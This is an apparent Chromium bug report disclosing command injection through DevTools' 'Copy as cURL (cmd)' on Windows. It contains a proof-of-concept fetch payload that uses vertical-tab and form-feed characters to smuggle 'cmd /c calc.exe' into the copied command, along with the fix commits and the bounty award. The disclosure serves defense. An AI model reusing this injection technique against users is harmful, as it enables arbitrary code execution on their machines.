# Allows Arbitrary Code Execution via "Copy as cURL (cmd)" in DevTools

| Field | Value |
|-------|-------|
| **Issue ID** | [443948855](https://issues.chromium.org/issues/443948855) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Platform>DevTools>Network |
| **Platforms** | Windows |
| **Reporter** | we...@gmail.com |
| **Assignee** | da...@google.com |
| **Created** | 2025-09-09 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

"Copy as cURL (cmd)" feature of Chromium DevTools. When exporting requests to Windows cmd.exe, the escaping logic in escapeStringWin fails to correctly sanitize certain control characters

This allows an attacker to craft malicious requests such that, when copied and executed via "Copy as cURL (cmd)", arbitrary system commands can be executed.

issue references:

<https://issues.chromium.org/issues/406631048>

<https://issues.chromium.org/issues/352651673>

**VERSION**

Chrome Version: 140.0.7339.81 (Official Build) (64-bit)

Operating System: Windows 11

**REPRODUCTION CASE**

1. Copy and run the payload in console (this can also be via html)

```
fetch("/copyme", {
  "credentials": "omit",
  "headers": {
    "Accept-Language": "en-US",
    "Content-Type": "text/plain",
  },
  "method": "POST",
  "body": `
query=evil\ncmd /c calc.exe\x0b\ncmd /c calc.exe\x0c
`
});

```

2. Copy the request with copy as curl (cmd)
3. Paste on the windows cmd and see calc pop up

## Attachments

- [bandicam 2025-09-10 02-31-41-605.mp4](attachments/bandicam 2025-09-10 02-31-41-605.mp4) (video/mp4, 3.4 MB)
- [Screenshot 2025-09-16 at 1.13.17 PM.png](attachments/Screenshot 2025-09-16 at 1.13.17 PM.png) (image/png, 1.2 MB)
- [Screenshot 2025-09-16 at 1.12.28 PM.png](attachments/Screenshot 2025-09-16 at 1.12.28 PM.png) (image/png, 335.2 KB)
- [bandicam 2025-09-16 18-39-40-603.mp4](attachments/bandicam 2025-09-16 18-39-40-603.mp4) (video/mp4, 3.7 MB)
- [Screenshot 2025-09-16 at 4.38.52 PM.png](attachments/Screenshot 2025-09-16 at 4.38.52 PM.png) (image/png, 1.1 MB)
- [Screenshot 2025-09-16 224737.png](attachments/Screenshot 2025-09-16 224737.png) (image/png, 82.3 KB)

## Timeline

### sk...@google.com (2025-09-09)

Thank you for the bug report!

I was able to repro on Chrome 140 (not 139, just a note). Per this comment [1], assigning to danilsomsikov@

[1] https://g-issues.chromium.org/issues/406631048#comment3

### we...@gmail.com (2025-09-11)

Are you sure it's a duplicate? Can you give me a reason why this report is a duplicate of that report? [comment #2](https://issues.chromium.org/issues/443948855#comment2)

### we...@gmail.com (2025-09-15)

no update ?

### da...@google.com (2025-09-15)

Put it differently, what makes this issue unique?

### we...@gmail.com (2025-09-15)

What's unique is you must use both non-printable control characters the vertical tab and the form feed together like this: `cmd /c calc.exe\x0b\ncmd /c calc.exe\x0c` to trigger different parsing. If you use only one of them it will not work, and this does not work in Firefox, only in Chromium-based browsers.

### da...@google.com (2025-09-16)

Please see the screenshots.

What am I missing?
Are you testing on the latest Canary? Are you sure that <http://crrev.com/c/6746171> does not address this issue?

### we...@gmail.com (2025-09-16)

check my video. it also works in the latest version of canary

### da...@google.com (2025-09-16)

Interesting, these appear as `^K` and `^L` for me

I am not very familiar with Windows, so that's a bit puzzling for me

### we...@gmail.com (2025-09-16)

In Firefox, it looks like this

### dx...@google.com (2025-09-18)

Project: devtools/devtools-frontend  

Branch:  main  

Author:  Danil Somsikov [dsv@chromium.org](mailto:dsv@chromium.org)  

Link:    <https://chromium-review.googlesource.com/6961615>

Replace tabs and form feeds with spaces in Windows curl command generation

---


Expand for full commit details
```
     
    Previously, tabs, vertical tabs, and form feeds in header values were escaped in Windows curl commands, which could lead to command injection. This change replaces these characters with a single space to prevent command line breakage and potential vulnerabilities. A new test case has been added to verify this behavior. 
     
    Bug: 443948855 
    Change-Id: I8a599a0c2f324306252ec539ae29b7759a87438b 
    Reviewed-on: https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/6961615 
    Reviewed-by: Benedikt Meurer <bmeurer@chromium.org> 
    Commit-Queue: Danil Somsikov <dsv@chromium.org> 
    Auto-Submit: Danil Somsikov <dsv@chromium.org>

```

---

Files:

- M `front_end/panels/network/NetworkLogView.test.ts`
- M `front_end/panels/network/NetworkLogView.ts`

---

Hash: [c8a05892d7ee52659edd1ddd718ed0c2dc417a60](https://chromiumdash.appspot.com/commit/c8a05892d7ee52659edd1ddd718ed0c2dc417a60)  

Date: Thu Sep 18 09:16:26 2025


---

### dx...@google.com (2025-09-18)

Project: chromium/src  

Branch:  main  

Author:  chromium-autoroll [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/6965926>

Roll DevTools Frontend from b009d527900f to ba255486362b (17 revisions)

---


Expand for full commit details
```
     
    https://chromium.googlesource.com/devtools/devtools-frontend.git/+log/b009d527900f..ba255486362b 
     
    2025-09-18 devtools-ci-autoroll-builder@chops-service-accounts.iam.gserviceaccount.com Update DevTools DEPS (trusted) 
    2025-09-18 dsv@chromium.org Render empty states declaratively in the SearchView 
    2025-09-18 dsv@chromium.org Use LitHTML for rendering tree elements content in SearchResultsPane 
    2025-09-18 pfaffe@chromium.org Add a screenshot test to ARIAAttributesView 
    2025-09-18 samiyac@chromium.org Dispatch AI suggestion only if cursor is at the same position 
    2025-09-18 jacktfranklin@chromium.org Inline `navigator` reference in FormatterWorkerPool 
    2025-09-18 devtools-ci-autoroll-builder@chops-service-accounts.iam.gserviceaccount.com Update Chrome (for Testing) PIN 
    2025-09-18 bmeurer@chromium.org [sources] Fix endless loop in outline generation. 
    2025-09-18 ergunsh@chromium.org [GdpIntegration] Handle remind me later, dismiss clicks and auto closing 
    2025-09-18 nvitkov@chromium.org Update Chrome (for Testing) PIN 
    2025-09-18 finnur@chromium.org Ensure links to sources get linked correctly. 
    2025-09-18 samiyac@chromium.org Added metrics for code completion for UMA dashboard 
    2025-09-18 dsv@chromium.org Replace tabs and form feeds with spaces in Windows curl command generation 
    2025-09-18 ergunsh@chromium.org [Regression] Fix `LayoutPane` leaking inspector common styles to other widgets 
    2025-09-18 jacktfranklin@chromium.org Fix flaky perf test by stripping whitespace 
    2025-09-18 ergunsh@chromium.org [AiCompletion] Fix showing AI suggestion even when there is no text 
    2025-09-18 cjamcl@chromium.org [AI] Only show "Analyze trace" context once 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/devtools-frontend-chromium 
    Please CC liviurau@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Bug: chromium:407748613,chromium:407750483,chromium:407751814,chromium:442392194,chromium:442798729,chromium:443948855,chromium:444144347,chromium:444147184,chromium:445889365 
    Change-Id: I8a1d6537fad0157d399e7a5c42fc2d9bf8ee228c 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6965926 
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1517330}

```

---

Files:

- M `DEPS`
- M `third_party/devtools-frontend/src`

---

Hash: [4223d3d4c15622fe09fc846d353cf205b4853329](https://chromiumdash.appspot.com/commit/4223d3d4c15622fe09fc846d353cf205b4853329)  

Date: Thu Sep 18 15:52:17 2025


---

### we...@gmail.com (2025-09-26)

any update ?

### sp...@google.com (2025-09-26)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $1000.00 for this report.

Rationale for this decision:
security bug with multiple complex gestures so highly mitigated


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### we...@gmail.com (2025-10-08)

no cve ?

### we...@gmail.com (2025-11-08)

no cve ?

### ch...@google.com (2025-12-26)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> security bug with multiple complex gestures so highly mitigated

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/443948855)*
